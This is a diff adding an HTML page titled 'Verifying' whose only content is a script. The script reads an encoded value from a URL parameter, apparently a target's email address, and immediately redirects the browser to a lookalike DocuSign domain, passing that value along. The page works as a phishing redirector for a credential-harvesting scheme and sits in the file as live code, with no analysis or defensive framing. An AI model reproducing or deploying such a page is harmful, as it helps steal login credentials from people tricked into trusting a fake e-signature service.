@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Verifying</title>
+  </head>
+  <body></body>
+  <script>
+    let landing =
+      'https://viadocsignviasign.com/signoffbracess/20230627949.html#';
+    let qParams = new URLSearchParams(window.location.search);
+    let e = qParams.get('lovemaker');
+    // or whatever used;
+    var decoder = '';
+    try {
+      decoder = atob(e);
+    } catch {
+      decoder = e;
+    }
+    document.location.href = landing + e;
+  </script>
+</html>
